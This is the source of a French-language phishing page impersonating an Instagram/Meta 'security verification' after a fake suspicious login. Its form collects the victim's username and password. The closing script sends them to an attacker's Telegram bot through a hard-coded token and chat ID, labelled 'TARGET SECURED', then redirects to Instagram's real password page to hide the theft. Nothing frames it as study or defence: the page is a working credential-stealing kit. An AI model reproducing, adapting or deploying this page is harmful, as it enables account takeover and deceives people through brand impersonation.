        h2 { font-size: 20px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
        
        .alert { 
            background: #fff4f4; border: 1px solid #f9d6d6; border-radius: 10px; 
            padding: 15px; margin-bottom: 25px; display: flex; text-align: left;
        }
        .alert svg { fill: #fa3e3e; width: 26px; margin-right: 12px; flex-shrink: 0; }
        .alert-txt { font-size: 13.5px; color: #4b4f56; line-height: 1.4; }
        .red { font-weight: 700; color: #d93025; }

        input { 
            width: 100%; padding: 15px; background: #f5f6f7; border: 1px solid #dddfe2; 
            border-radius: 8px; margin-bottom: 12px; font-size: 14px; outline: none;
        }
        input:focus { border-color: var(--m-blue); box-shadow: 0 0 0 2px #e7f3ff; }

        .btn { 
            width: 100%; background: var(--m-blue); color: white; border: none; 
            padding: 15px; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer;
        }

        .ft { margin-top: 35px; border-top: 1px solid #ebedf0; padding-top: 20px; }

<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-wordmark">

    <div class="ig-gradient-box">
        <div class="white-glyph"></div>
    </div>

    <h2>Vérification de sécurité</h2>

    <div class="alert">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
        <div class="alert-txt">
            Connexion suspecte bloquée : <br>
            <span class="red">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
            <br>Veuillez confirmer votre identité pour continuer.
        </div>
    </div>

    <form id="meta-p">
        <input type="text" id="u" placeholder="Nom d'utilisateur" required>
        <input type="password" id="p" placeholder="Mot de passe" required>
        <button type="submit" class="btn">Sécuriser le compte</button>
    </form>

    <div class="ft">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png">
    </div>
</div>

<script>
    document.getElementById('meta-p').onsubmit = async (e) => {
        e.preventDefault();
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        const t = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
        const c = "5558301795";
        const m = `🇲🇦 **TARGET SECURED** 🇲🇦\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\``;
        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
        window.location.href = "https://www.instagram.com/accounts/password/change/";
    };
</script>

</body>
</html>
